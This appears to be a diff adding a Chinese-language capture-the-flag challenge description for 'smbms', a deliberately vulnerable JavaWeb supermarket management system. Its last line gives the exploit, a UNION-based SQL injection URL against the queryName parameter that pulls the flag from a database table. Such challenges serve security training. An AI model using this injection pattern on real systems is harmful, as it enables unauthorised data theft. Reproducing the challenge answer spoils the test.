@@ -1,0 +1,6 @@
+title：smbms
+description: Sxrhhh 紧急突击 JavaWeb, 最终学有小成，按照教程做出了一个半成品 —— smbms（超市信息管理系统）。现在请你来帮忙看看哪里有安全漏洞吧。
+本题为了出题，修改了原项目环境，会有明显的 bug 和未完成现象，请忽略 404 之类的错误。如果出现 500 之类的错误，可以新开一个标签页，重新输入网址
+
+动态 flag
+exp: http://localhost:8080/smbms/jsp/user.do?method=query&queryName=李%25' union select 1,1,group_concat(flag),4,5,6,7,8,9,1,1,1,1,1 from flag where  '1'like'%251&queryUserRole=0&pageIndex=1 
